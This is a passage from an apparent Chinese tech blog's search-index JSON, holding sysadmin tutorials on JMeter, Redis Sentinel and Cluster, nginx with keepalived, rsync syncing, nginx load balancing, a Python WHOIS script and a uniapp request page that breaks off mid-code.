--create-schema=test_db --query=insert_data.sql –concurrency&#x3D;50：使用 50 个并发连接。–iterations&#x3D;1：执行一次迭代。–create-schema&#x3D;test_db：创建并使用 test_db 数据库。–query&#x3D;insert_data.sql：使用 insert_data.sql 文件中的 SQL 语句。","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"https://banjinmei.github.io/tags/mysql/"}],"author":"mu"},{"title":"Jmeter 压测工具","slug":"Jmeter-压测工具","date":"2024-11-22T14:53:27.000Z","updated":"2024-11-22T14:54:54.773Z","comments":true,"path":"2024/11/22/Jmeter-压测工具/","permalink":"https://banjinmei.github.io/2024/11/22/Jmeter-%E5%8E%8B%E6%B5%8B%E5%B7%A5%E5%85%B7/","excerpt":"","text":"JMeter下载地址： Apache JMeterhttps://jmeter.apache.org/download_jmeter.cgi 选择二进制包下载后解压，双击&#x2F;bin&#x2F;jmeter.bat（依赖java环境） 语言设置可以在Options&#x2F;Choose Language将语言设置为中文 创建线程组右键Test PlanTest Plan-&gt;添加-&gt;线程（用户）-&gt;线程组 名称：线程组名称注释（可选设置）线程数：可以用作是用户数，即多少个同时并发向API发送请求Ramp-Up时间：在设定的时间内启动上面设置的线程数循环次数：即一个线程发送设定的请求，可以勾选永远，这样线程就会一直发送API请求 添加HTTP请求右键线程组线程组-&gt;添加-&gt;取样器-&gt;HTTP请求 设置HTTP请求名称：接口名称注释（可选）协议：http&#x2F;https服务器名称或IP：服务器域名或IP地址端口号：web程序监听的端口号请求方法：GET&#x2F;POST&#x2F;…路径：API接口路径 添加HTTP请求头右键线程组线程组-&gt;添加-&gt;配置元件-&gt;HTTP信息头 设置接口的HTTP请求头 添加监听器查看结果树：可以查看请求响应是否成功，也可以看到响应内存 线程组-&gt;添加-&gt;监听器-&gt;查看结构树 TCP线程组-&gt;添加-&gt;取样器-&gt; TCP取样器SERVER IP 端口 发送文本 java环境在Windows上安装Java环境通常涉及到两个主要步骤：安装Java运行环境（JRE）或开发工具包（JDK），以及设置环境变量。以下是详细的步骤说明： 1. 下载JDK首先，需要从Oracle官网或其他可信的来源下载最新的JDK版本。访问Oracle JDK下载页面，https://www.oracle.com/java/technologies/downloads/#java17 选择适合的操作系统的版本进行下载。注意，页面上的链接可能会随着新版本的发布而变化。 2. 安装JDK双击下载好的安装文件开始安装过程。在安装过程中，可以选择自定义安装路径。建议选择一个容易记住的位置，比如 C:\\Program Files\\Java\\jdk-xx（其中 xx 是安装的JDK版本号）。按照提示完成安装。 3. 设置环境变量为了能够在命令行中任意位置使用 java 和 javac 命令，需要配置系统环境变量。 打开系统属性：右键点击“此电脑”或“我的电脑”，选择“属性”。点击“高级系统设置”。在“高级”选项卡下，点击“环境变量”。设置JAVA_HOME：在“系统变量”部分，点击“新建”，然后添加变量名为 JAVA_HOME。将变量值设为JDK的安装目录，例如 C:\\Program Files\\Java\\jdk-xx。修改Path变量：找到并选中“系统变量”中的 Path 变量，然后点击“编辑”。添加一个新的条目，其值为 %JAVA_HOME%\\bin。这使得系统可以在任何地方识别 java 和 javac 命令。 4. 验证安装打开命令提示符（CMD），输入以下命令来验证安装是否成功： 输入 java -version 查看Java版本信息。输入 javac -version 查看Java编译器版本信息。如果能够正确显示版本信息，则表示Java环境已经成功安装并且配置正确。","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"jmeter","slug":"jmeter","permalink":"https://banjinmei.github.io/tags/jmeter/"},{"name":"jvav","slug":"jvav","permalink":"https://banjinmei.github.io/tags/jvav/"}],"author":"mu"},{"title":"redis sentinel cluster","slug":"redis-sentinel-cluster","date":"2024-11-22T14:18:29.000Z","updated":"2024-11-22T14:37:47.028Z","comments":true,"path":"2024/11/22/redis-sentinel-cluster/","permalink":"https://banjinmei.github.io/2024/11/22/redis-sentinel-cluster/","excerpt":"","text":"Debian 服务器上部署分布式 Redis 可以实现高可用性或负载均衡，具体可以选择以下两种方案之一： 主从复制 (Master-Slave Replication)主从复制用于数据冗余备份和读写分离，但并不提供自动故障切换功能。 Redis Sentinel (哨兵模式)Redis Sentinel 在主从复制的基础上增加了自动故障切换功能，用于实现高可用性。 Redis Cluster (集群模式)Redis Cluster 是一种分布式部署方式，支持数据分片和高可用性，适用于需要扩展性的场景。 Redis Sentinel 部署架构两台服务器：主 Redis 服务器（假设 IP：192.168.1.101）从 Redis 服务器（假设 IP：192.168.1.102）Sentinel 哨兵进程：每台服务器运行一个 Sentinel 进程，用于监控和故障切换。 步骤 1：安装 Redis在两台服务器上分别安装 Redis： 12sudo apt updatesudo apt install redis-server 验证 Redis 版本： 1redis-server --version 步骤 2：配置 Redis 主从复制在主服务器 (192.168.1.101) 上编辑 Redis 配置文件 &#x2F;etc&#x2F;redis&#x2F;redis.conf： 123bind 0.0.0.0 # 允许外部访问protected-mode no # 关闭保护模式（测试环境使用）appendonly yes # 开启持久化 启动 Redis 服务： 1sudo systemctl restart redis 在从服务器 (192.168.1.102) 上编辑 Redis 配置文件 &#x2F;etc&#x2F;redis&#x2F;redis.conf： 123456bind 0.0.0.0protected-mode noappendonly yes# 设置为主服务器的从节点replicaof 192.168.1.101 6379 启动 Redis 服务： 1sudo systemctl restart redis 验证主从复制在主服务器上设置一个测试键： 12redis-cliset mykey &quot;hello_redis&quot; 在从服务器上读取： 123redis-cliget mykey# 返回 &quot;hello_redis&quot; 步骤 3：配置 Redis Sentinel在两台服务器上配置 Redis Sentinel。Redis 自带 Sentinel 二进制文件，不需要额外安装。 配置主服务器的 Sentinel编辑 &#x2F;etc&#x2F;redis&#x2F;sentinel.conf： 1234567891011121314bind 0.0.0.0 # 允许外部访问protected-mode no # 关闭保护模式（测试环境使用）# 监控主节点，设置 quorum 为 2sentinel monitor mymaster 192.168.1.101 6379 2# 如果主节点在 5 秒内无响应，则认为其失效sentinel down-after-milliseconds mymaster 5000# 设置故障切换的超时时间sentinel failover-timeout mymaster 10000# 如果主节点有密码，需添加以下配置# sentinel auth-pass mymaster &lt;password&gt; 配置从服务器的 Sentinel在从服务器上，配置 &#x2F;etc&#x2F;redis&#x2F;sentinel.conf，内容与主服务器一致。 步骤 4：启动 Redis Sentinel在两台服务器上启动 Sentinel： 1redis-server /etc/redis/sentinel.conf --sentinel 检查是否启动成功： 1ps aux | grep redis 应该能看到 Redis Sentinel 进程运行。 步骤 5：测试高可用性模拟主节点故障在主服务器上停止 Redis 服务： 1sudo systemctl stop redis Sentinel 检测到主节点不可用后，会自动将从节点（192.168.1.102）提升为主节点。 验证故障切换在 Sentinel 中查看新的主节点： 12redis-cli -p 26379SENTINEL get-master-addr-by-name mymaster 应返回从节点的 IP 和端口（192.168.1.102:6379）。 恢复主节点启动主节点服务： 1sudo systemctl start redis 主节点会自动成为新的从节点，重新加入集群。 附加：常用命令查看 Sentinel 监控的所有节点： 12redis-cli -p 26379SENTINEL masters 查看特定主节点的所有从节点： 12redis-cli -p 26379SENTINEL slaves mymaster 手动触发故障切换： 12redis-cli -p 26379SENTINEL failover mymaster 部署总结Redis Sentinel 实现了主从复制的监控和自动故障切换，其核心是： 主节点负责写操作，从节点提供读操作。Sentinel 检测主节点是否不可用，并自动将从节点提升为主节点。整个系统实现了高可用性，无需人工干预。 三台服务器 假设有三台服务器： 主节点（Master）：192.168.1.101从节点1（Replica1）：192.168.1.102从节点2（Replica2）：192.168.1.103每台服务器同时运行 Redis 和 Sentinel。 1. 安装 Redis在所有服务器上安装 Redis： 12sudo apt updatesudo apt install redis-server 验证 Redis 安装： 1redis-server --version 2. 配置主从复制主节点配置（192.168.1.101）编辑 &#x2F;etc&#x2F;redis&#x2F;redis.conf： 123bind 0.0.0.0protected-mode noappendonly yes 启动 Redis 主节点： 1sudo systemctl restart redis 从节点配置（192.168.1.102 和 192.168.1.103）编辑 &#x2F;etc&#x2F;redis&#x2F;redis.conf： 123456bind 0.0.0.0protected-mode noappendonly yes# 配置为从节点，指向主节点 IP 和端口replicaof 192.168.1.101 6379 启动 Redis 从节点： 12sudo systemctl restart redis 验证主从同步在主节点上插入数据： 12redis-cliSET test_key &quot;hello_redis&quot; 在从节点验证： 123redis-cliGET test_key# 应返回 &quot;hello_redis&quot; 3. 配置 Sentinel配置文件路径默认 Sentinel 配置文件路径为 &#x2F;etc&#x2F;redis&#x2F;sentinel.conf。 编辑 Sentinel 配置文件在所有服务器（192.168.1.101、192.168.1.102、192.168.1.103）上，编辑 &#x2F;etc&#x2F;redis&#x2F;sentinel.conf： 1234567891011121314bind 0.0.0.0protected-mode no# 定义监控的主节点名称和地址sentinel monitor mymaster 192.168.1.101 6379 2# 配置检测主节点失败的时间（毫秒）sentinel down-after-milliseconds mymaster 5000# 配置故障转移完成的超时时间（毫秒）sentinel failover-timeout mymaster 10000# 如果启用了密码认证，请设置主节点密码# sentinel auth-pass mymaster &lt;的密码&gt; 启动 Sentinel在每台服务器上分别启动 Sentinel： 1redis-server /etc/redis/sentinel.conf --sentinel 4. 验证 Sentinel查看 Sentinel 状态在任意 Sentinel 节点执行以下命令： 12redis-cli -p 26379SENTINEL masters 输出应显示主节点的信息，例如： name: mymaster, status: ok, slaves: 2 模拟故障转移手动停止主节点服务： 1sudo systemctl stop redis Sentinel 将检测主节点不可用，并自动提升从节点为主节点。验证新的主节点： 12redis-cli -p 26379SENTINEL get-master-addr-by-name mymaster 新主节点的 IP 和端口将被返回。 5. 高可用性测试在新主节点上插入数据： 12redis-cli -h &lt;新主节点IP&gt;SET test_key2 &quot;new_data&quot; 验证数据是否同步到从节点： 12redis-cli -h &lt;从节点IP&gt;GET test_key2 总结通过 Redis Sentinel，可以实现： 自动故障检测：当主节点不可用时，Sentinel 会自动检测并进行切换。自动主从切换：从节点自动提升为主节点，保障服务持续可用。无需人工干预：服务的高可用性大大提高。如需进一步调整配置（如增加节点或优化参数），可根据具体业务需求进行调整。 Redis Cluster步骤一：安装Redis在每台服务器上安装Redis。 12sudo apt updatesudo apt install redis-server 步骤二：配置Redis备份原始配置文件： 1sudo cp /etc/redis/redis.conf /etc/redis/redis.conf.bak 编辑Redis配置文件：编辑 &#x2F;etc&#x2F;redis&#x2F;redis.conf 文件，进行以下修改：启用集群模式： cluster-enabled yes指定集群配置文件： cluster-config-file nodes-6379.conf设置节点超时时间：cluster-node-timeout 5000启用AOF持久化（可选，但推荐）：appendonly yes绑定服务器的IP地址：将 bind 127.0.0.1 修改为服务器的实际IP地址，例如：bind 192.168.1.1设置监听端口：默认端口是6379，确保每个节点的端口不同。例如，第一台服务器保持6379，第二台服务器可以设置为6380，第三台服务器可以设置为6381。 步骤三：启动Redis服务在每台服务器上启动Redis服务： 1sudo systemctl restart redis-server 步骤四：创建Redis集群下载Redis工具：如果你还没有安装Redis的命令行工具，可以从官方GitHub仓库下载最新的Redis版本，解压后找到 redis-trib.rb 脚本。创建集群：使用 redis-cli 工具来创建集群。假设你的三台服务器的IP地址分别为 192.168.1.1、192.168.1.2 和 192.168.1.3，且Redis实例分别监听6379、6380和6381端口，命令如下： 1redis-cli --cluster create 192.168.1.1:6379 192.168.1.2:6380 192.168.1.3:6381 --cluster-replicas 1 这里 –cluster-replicas 1 表示每个主节点有一个副本。 步骤五：验证集群连接到任意一个节点： 1redis-cli -h 192.168.1.1 -p 6379 执行基本命令： 12set testkey &quot;Hello Redis Cluster&quot;get testkey 检查集群状态： 1cluster nodes 步骤六：监控和维护定期检查日志：查看 &#x2F;var&#x2F;log&#x2F;redis&#x2F;redis-server.log 文件中的日志信息，确保没有错误。监控性能：使用 redis-cli 的 info 命令来监控集群的性能和状态： 1redis-cli -h 192.168.1.1 -p 6379 info Debian root登录123echo &#x27;PermitRootLogin yes&#x27; &gt;&gt; /etc/ssh/sshd_config# 重启ssh服务，使配置生效sudo systemctl restart ssh debian 更换源1. 备份文件cp &#x2F;etc&#x2F;apt&#x2F;sources.list &#x2F;etc&#x2F;apt&#x2F;sources.list.bak 2. 更改 sources.list文件内容为：(官方源)deb http://deb.debian.org/debian bullseye main contrib non-freedeb-src http://deb.debian.org/debian bullseye main contrib non-free 3. 更新apt-get -y update","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"redis","slug":"redis","permalink":"https://banjinmei.github.io/tags/redis/"}],"author":"mu"},{"title":"nginx keepalived","slug":"nginx-keepalived","date":"2024-11-21T15:37:23.000Z","updated":"2024-11-21T15:54:57.040Z","comments":true,"path":"2024/11/21/nginx-keepalived/","permalink":"https://banjinmei.github.io/2024/11/21/nginx-keepalived/","excerpt":"","text":"Keepalived是一种用于实现高可用性的工具，它通过VRRP（虚拟路由冗余协议）来管理虚拟IP地址，从而确保在主服务器故障时，备用服务器能够接管服务。 环境准备假设有两台Debian服务器： Server 1 (Master): IP地址 192.168.1.100Server 2 (Backup): IP地址 192.168.1.101虚拟IP地址: 192.168.1.102 步骤一：安装Nginx在两台服务器上安装Nginx。 Server 1 (Master) 12sudo apt updatesudo apt install nginx Server 2 (Backup) 12sudo apt updatesudo apt install nginx 步骤二：安装Keepalived在两台服务器上安装Keepalived。 Server 1 (Master) 1234sudo apt install keepalivedServer 2 (Backup)```Bashsudo apt install keepalived 步骤三：配置Keepalived编辑Keepalived的配置文件 &#x2F;etc&#x2F;keepalived&#x2F;keepalived.conf。 Server 1 (Master) 1sudo nano /etc/keepalived/keepalived.conf 添加以下配置： 12345678910111213141516vrrp_instance VI_1 &#123; state MASTER interface eth0 virtual_router_id 51 priority 100 advert_int 1 authentication &#123; auth_type PASS auth_pass 1111 &#125; virtual_ipaddress &#123; 192.168.1.102 &#125;&#125; Server 2 (Backup) 1sudo nano /etc/keepalived/keepalived.conf 添加以下配置： 12345678910111213141516vrrp_instance VI_1 &#123; state BACKUP interface eth0 virtual_router_id 51 priority 90 advert_int 1 authentication &#123; auth_type PASS auth_pass 1111 &#125; virtual_ipaddress &#123; 192.168.1.102 &#125;&#125; 步骤四：启动Keepalived启动并启用Keepalived服务。 Server 1 (Master) 12sudo systemctl start keepalivedsudo systemctl enable keepalived Server 2 (Backup) 12sudo systemctl start keepalivedsudo systemctl enable keepalived 步骤五：配置Nginx确保两台服务器上的Nginx配置相同。编辑Nginx配置文件 &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;default。 Nginx 123456789101112server &#123; listen 80; server_name your_domain_or_ip; location / &#123; proxy_pass http://backend_servers; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; &#125;&#125; 步骤六：测试配置测试Nginx配置文件是否正确无误： 1sudo nginx -t 重新加载Nginx以使更改生效： 1sudo systemctl reload nginx 步骤七：验证高可用性访问虚拟IP地址:使用浏览器或其他工具访问虚拟IP地址 192.168.1.102，确保Nginx服务正常工作。模拟故障:关闭主服务器上的Nginx服务或Keepalived服务，观察备用服务器是否接管虚拟IP地址。 12sudo systemctl stop nginxsudo systemctl stop keepalived 检查状态:在备用服务器上检查虚拟IP地址是否已经接管： 1ip addr show eth0 步骤八：日志和监控查看Keepalived的日志以确保没有错误： 1sudo tail -f /var/log/syslog 通过以上步骤，可以在两台Debian服务器上成功部署Keepalived实现高可用Nginx。这样，即使主服务器发生故障，备用服务器也会自动接管服务，确保系统的高可用性和稳定性。 不同虚拟IP地址的高可用性：跨云服务商 1. 使用DNS轮询通过DNS轮询（Round Robin DNS）来实现负载均衡和高可用性。 步骤：如 example.com。配置DNS记录:在DNS管理面板中，为的域名配置两个A记录，分别指向两个云服务商的IP地址。 12example.com. A 192.168.1.100 (阿里云IP)example.com. A 192.168.1.101 (腾讯云IP) 客户端访问:当客户端访问 example.com 时，DNS服务器会轮流返回两个IP地址之一，实现负载均衡。健康检查:可以使用DNS提供商的健康检查功能，自动将流量切换到健康的服务器。 2. 使用全局负载均衡器一些云服务商提供了全局负载均衡器（Global Load Balancer），可以跨区域和跨服务商实现高可用性。 nginx 配置文件的同步使用 inotify 和 rsync 实现两个 Debian 服务器之间的数据实时同步是一个常见且有效的方法。inotify 可以监控文件系统的变更事件，而 rsync 则负责实际的数据同步。以下是详细的步骤： 环境准备Server 1 (Master): IP地址 192.168.1.100Server 2 (Backup): IP地址 192.168.1.101 步骤一：安装必要的软件在两台服务器上安装 rsync 和 inotify-tools。 Server 1 (Master) 12sudo apt updatesudo apt install rsync inotify-tools Server 2 (Backup) 12sudo apt updatesudo apt install rsync 步骤二：配置 SSH 密钥免密登录为了简化 rsync 的操作，建议配置从主服务器到备份服务器的 SSH 密钥免密登录。 在主服务器上生成 SSH 密钥 1ssh-keygen -t rsa -b 4096 按提示操作，默认保存路径即可。 将公钥复制到备份服务器 1ssh-copy-id user@192.168.1.101 步骤三：编写同步脚本在主服务器上编写一个脚本，使用 inotifywait 监控文件系统的变更事件，并调用 rsync 进行同步。 创建同步脚本 1nano /usr/local/bin/inotify_sync.sh 添加以下内容： 123456789101112131415161718#!/bin/bash# 监控的目录WATCH_DIR=&quot;/path/to/sync&quot;# 备份服务器的IP地址和目标目录REMOTE_USER=&quot;user&quot;REMOTE_HOST=&quot;192.168.1.101&quot;REMOTE_DIR=&quot;/path/to/sync&quot;# 使用 inotifywait 监控目录变化inotifywait -m -r -e modify,create,delete,move &quot;$WATCH_DIR&quot; | while read path action file; do echo &quot;Change detected: $action $file on $path&quot; # 使用 rsync 同步文件 rsync -avz --delete --exclude &#x27;.git&#x27; --exclude &#x27;.DS_Store&#x27; &quot;$WATCH_DIR/&quot; &quot;$REMOTE_USER@$REMOTE_HOST:$REMOTE_DIR/&quot;done 赋予脚本执行权限 1chmod +x /usr/local/bin/inotify_sync.sh 步骤四：启动同步脚本可以手动启动脚本，或者将其添加到 systemd 服务中以确保其在后台持续运行。 手动启动 12nohup /usr/local/bin/inotify_sync.sh &amp; 创建 systemd 服务 启动创建服务文件 1sudo nano /etc/systemd/system/inotify_sync.service 添加以下内容： 1234567891011121314Ini[Unit]Description=Inotify Sync ServiceAfter=network.target[Service]User=rootExecStart=/usr/local/bin/inotify_sync.shRestart=always[Install]WantedBy=multi-user.target 启动并启用服务 123sudo systemctl daemon-reloadsudo systemctl start inotify_sync.servicesudo systemctl enable inotify_sync.service 步骤五：验证同步在主服务器上创建或修改文件: 1echo &quot;Test content&quot; &gt; /path/to/sync/testfile.txt 在备份服务器上检查文件: 12ls /path/to/sync/cat /path/to/sync/testfile.txt 注意事项性能考虑:inotify 会消耗一定的系统资源，特别是在监控大量文件时。确保的服务器有足够的资源来处理这些事件。可以通过排除不必要的文件或目录（如 .git、.DS_Store）来减少不必要的同步操作。安全考虑:确保 SSH 密钥的安全性，避免泄露。可以使用更严格的 SSH 配置，例如限制密钥的使用范围和有效期。通过以上步骤，可以在两台 Debian 服务器之间使用 inotify 和 rsync 实现实时数据同步。 nginx 反代在Debian系统上安装Nginx并配置反向代理到特定的IP地址和端口 1. 更新软件包列表首先，确保软件包列表是最新的。打开终端并执行： 1sudo apt update 2. 安装Nginx1sudo apt install nginx . 配置Nginx作为反向代理安装完成后，需要编辑Nginx的配置文件来设置反向代理。默认情况下，Nginx的配置文件位于&#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;default。 使用喜欢的文本编辑器（如nano或vim）打开此文件： 1sudo nano /etc/nginx/sites-available/default 在文件中找到server块，并添加或修改如下配置以设置反向代理。假设要将所有请求代理到192.168.1.100:8080： 123456789101112131415161718Nginxserver &#123; listen 80; server_name your_domain_or_ip; location / &#123; proxy_pass http://192.168.1.100:8080; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; &#125;&#125;listen 80; 指定了Nginx监听的端口号，这里使用的是80端口，即HTTP服务的标准端口。server_name 应该替换为域名或服务器的公网IP地址。proxy_pass 指令用于指定要代理的目标服务器的URL。proxy_set_header 指令用于设置转发给后端服务器的请求头信息。 4. 测试配置文件在保存并退出编辑器之后，测试Nginx配置是否正确无误： 1sudo nginx -t 如果输出显示语法正确且测试成功，可以继续下一步。 5. 重新加载Nginx使更改生效，需要重新加载Nginx服务： 1sudo systemctl reload nginx 6. 验证反向代理工作情况现在，可以通过浏览器访问域名或服务器的公网IP地址，看看是否能够正确地将请求代理到192.168.1.100:8080。 如果遇到任何问题，可以查看Nginx的日志文件来诊断问题。错误日志通常位于&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log。 Nginx中配置多个反向代理目标可以使用upstream模块来定义一个负载均衡池。Nginx可以根据配置的策略（例如轮询、最少连接等）将请求分发到不同的后端服务器。 以下是具体步骤： 1. 编辑Nginx配置文件打开Nginx的配置文件： 12sudo nano /etc/nginx/sites-available/default 2. 添加upstream块在配置文件的顶部或适当位置添加一个upstream块，定义后端服务器池： 12345Nginxupstream backend_servers &#123; server 192.168.1.100:8080; server 192.168.1.101:8081;&#125; 3. 修改server块在server块中，将proxy_pass指令指向刚刚定义的upstream块： 1234567891011121314Nginxserver &#123; listen 80; server_name your_domain_or_ip; location / &#123; proxy_pass http://backend_servers; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; &#125;&#125; 4. 测试配置文件保存并退出编辑器后，测试Nginx配置是否正确无误： 1sudo nginx -t 5. 重新加载Nginx如果测试成功，重新加载Nginx以使更改生效： 1sudo systemctl reload nginx 6. 验证配置通过浏览器访问域名或服务器的公网IP地址，检查请求是否正确地被分发到两个后端服务器。 7. 进一步配置（可选）如果需要更复杂的负载均衡策略，可以在upstream块中添加更多选项。例如： 轮询（默认）：每个请求按时间顺序逐一分配到不同的服务器，如果后端某个服务器宕机，能自动剔除。最少连接：请求分配给连接数最少的服务器。IP哈希：每个请求按访问客户端的IP哈希结果分配，这样来自同一客户端的请求会分配到同一台后端服务器。示例配置： 1234567891011121314Nginxupstream backend_servers &#123; # 轮询（默认） server 192.168.1.100:8080; server 192.168.1.101:8081; # 最少连接 # least_conn; # IP哈希 # ip_hash;&#125; 负载均衡策略及其配置方法：1. 轮询（默认）轮询是Nginx默认的负载均衡策略，每个请求按时间顺序逐一分配到不同的服务器。如果后端某个服务器宕机，Nginx会自动将其从轮询列表中剔除。 1234upstream backend_servers &#123; server 192.168.1.100:8080; server 192.168.1.101:8081;&#125; 2. 最少连接最少连接策略将请求分配给当前连接数最少的服务器，适用于处理长连接的场景。 12345upstream backend_servers &#123; least_conn; server 192.168.1.100:8080; server 192.168.1.101:8081;&#125; 3. IP哈希IP哈希策略根据客户端的IP地址进行哈希运算，确保来自同一客户端的请求总是被分配到同一台后端服务器。这在会话保持（Session Stickiness）场景中非常有用。 12345upstream backend_servers &#123; ip_hash; server 192.168.1.100:8080; server 192.168.1.101:8081;&#125; 4. 加权轮询加权轮询允许为每个后端服务器分配权重，权重越高，被分配到请求的概率越大。 1234upstream backend_servers &#123; server 192.168.1.100:8080 weight=3; server 192.168.1.101:8081 weight=1;&#125; 5. 备用服务器可以指定备用服务器，当主服务器不可用时，请求会被转发到备用服务器。 1234upstream backend_servers &#123; server 192.168.1.100:8080; server 192.168.1.101:8081 backup;&#125; 6. 组合策略也可以组合使用多种策略，例如同时使用IP哈希和加权轮询。 12345upstream backend_servers &#123; ip_hash; server 192.168.1.100:8080 weight=3; server 192.168.1.101:8081 weight=1;&#125; 7. 测试和应用配置完成配置后，测试Nginx配置文件是否正确无误： 1sudo nginx -t 如果测试成功，重新加载Nginx以使更改生效： 1sudo systemctl reload nginx 8. 验证配置通过浏览器或其他工具访问域名或服务器的公网IP地址，检查请求是否按预期被分发到不同的后端服务器。使用日志或后端服务器上的访问记录来验证负载均衡的效果。 通过这些配置，可以实现更灵活和强大的负载均衡策略，以满足不同业务场景的需求。 完整的Nginx配置示例完整的Nginx配置示例，其中包含两台主用服务器和一台备用服务器。这个配置将使用轮询策略，并且备用服务器将在主用服务器不可用时接管请求。 12345678910111213141516171819202122232425262728293031323334353637# /etc/nginx/sites-available/default# 定义上游服务器组upstream backend_servers &#123; # 主用服务器 server 192.168.1.100:8080; server 192.168.1.101:8081; # 备用服务器 server 192.168.1.102:8082 backup;&#125;# 定义服务器块server &#123; listen 80; server_name your_domain_or_ip; # 定义location块 location / &#123; proxy_pass http://backend_servers; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; &#125; # 可选：定义错误页面 error_page 404 /404.html; location = /404.html &#123; internal; &#125; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; internal; &#125;&#125; upstream 块:server 192.168.1.100:8080; 和 server 192.168.1.101:8081; 是两台主用服务器。server 192.168.1.102:8082 backup; 是一台备用服务器，只有在主用服务器不可用时才会被使用。server 块:listen 80; 指定了Nginx监听的端口号，这里是80端口。server_name your_domain_or_ip; 应该替换为域名或服务器的公网IP地址。location 块:proxy_pass http://backend_servers; 将请求代理到定义的上游服务器组。proxy_set_header 指令用于设置转发给后端服务器的请求头信息。错误页面:error_page 404 &#x2F;404.html; 和 location &#x3D; &#x2F;404.html { internal; } 用于定义404错误页面。error_page 500 502 503 504 &#x2F;50x.html; 和 location &#x3D; &#x2F;50x.html { internal; } 用于定义500系列错误页面。 日志:查看Nginx的访问日志和错误日志，确保一切正常： 1234Bashsudo tail -f /var/log/nginx/access.logsudo tail -f /var/log/nginx/error.log 以实现两台主用服务器和一台备用服务器的负载均衡。","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"nigix","slug":"nigix","permalink":"https://banjinmei.github.io/tags/nigix/"},{"name":"keepalived","slug":"keepalived","permalink":"https://banjinmei.github.io/tags/keepalived/"},{"name":"inotify","slug":"inotify","permalink":"https://banjinmei.github.io/tags/inotify/"},{"name":"rsync","slug":"rsync","permalink":"https://banjinmei.github.io/tags/rsync/"}],"author":"mu"},{"title":"python whoisdomain","slug":"python-whoisdomain","date":"2024-11-21T15:31:52.000Z","updated":"2024-11-21T15:32:33.020Z","comments":true,"path":"2024/11/21/python-whoisdomain/","permalink":"https://banjinmei.github.io/2024/11/21/python-whoisdomain/","excerpt":"","text":"1pip install python-whois 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import whois# 读取文件中的域名def read_domains_from_file(file_path): with open(file_path, &#x27;r&#x27;) as file: domains = [line.strip() for line in file if line.strip()] return domains# 查询域名的WHOIS信息def query_whois(domain): try: domain_info = whois.whois(domain) if domain_info.domain_name: return domain_info else: return None except Exception as e: print(f&quot;Error querying WHOIS for &#123;domain&#125;: &#123;e&#125;&quot;) return None# 保存查询结果到文件def save_results_to_file(domains, results, output_file): with open(output_file, &#x27;w&#x27;) as file: for domain, result in results.items(): if result: file.write(f&quot;Domain: &#123;domain&#125;\\n&quot;) file.write(&quot;WHOIS Information:\\n&quot;) for key, value in result.items(): if isinstance(value, list): for item in value: file.write(f&quot;&#123;key&#125;: &#123;item&#125;\\n&quot;) else: file.write(f&quot;&#123;key&#125;: &#123;value&#125;\\n&quot;) file.write(&quot;\\n&quot;) else: file.write(f&quot;Domain: &#123;domain&#125; - Not Registered\\n\\n&quot;)# 主函数def main(): file_path = &#x27;12.txt&#x27; # 文件路径 output_file = &#x27;whois_results2.txt&#x27; # 输出文件路径 domains = read_domains_from_file(file_path) results = &#123;&#125; for domain in domains: domain_info = query_whois(domain) results[domain] = domain_info save_results_to_file(domains, results, output_file) print(f&quot;WHOIS results have been saved to &#123;output_file&#125;&quot;)if __name__ == &quot;__main__&quot;: main()","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"python","slug":"python","permalink":"https://banjinmei.github.io/tags/python/"}],"author":"mu"},{"title":"uniapp postman","slug":"uniapp-postman","date":"2024-11-21T13:43:36.000Z","updated":"2024-11-21T14:21:55.730Z","comments":true,"path":"2024/11/21/uniapp-postman/","permalink":"https://banjinmei.github.io/2024/11/21/uniapp-postman/","excerpt":"","text":"基础页面123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;template&gt; &lt;view class=&quot;content&quot;&gt; &lt;input v-model=&quot;url&quot; placeholder=&quot;请输入请求地址&quot; /&gt; &lt;picker :range=&quot;methods&quot; @change=&quot;onMethodChange&quot;&gt; &lt;view&gt;&#123;&#123; methods[selectedIndex] &#125;&#125;&lt;/view&gt; &lt;/picker&gt; &lt;textarea v-model=&quot;body&quot; placeholder=&quot;请输入请求体&quot;&gt;&lt;/textarea&gt; &lt;button @click=&quot;sendRequest&quot;&gt;发送请求&lt;/button&gt; &lt;view v-if=&quot;response&quot; class=&quot;response&quot;&gt; &lt;text&gt;响应:&lt;/text&gt; &lt;pre&gt;&#123;&#123; response &#125;&#125;&lt;/pre&gt; &lt;/view&gt; &lt;/view&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data() &#123; return &#123; url: &#x27;&#x27;, body: &#x27;&#x27;, response: &#x27;&#x27;, methods: [&#x27;GET&#x27;, &#x27;POST&#x27;], selectedIndex: 0 &#125;; &#125;, methods: &#123; onMethodChange(e) &#123; this.selectedIndex = e.detail.value; &#125;, sendRequest() &#123; const method = this.methods[this.selectedIndex]; const data = method === &#x27;POST&#x27; ? JSON.parse(this.body) : null; uni.request(&#123; url: this.url, method: method, data: data, success: (res) =&gt; &#123; this.response = JSON.stringify(res.data, null, 2); &#125;, fail: (err) =&gt; 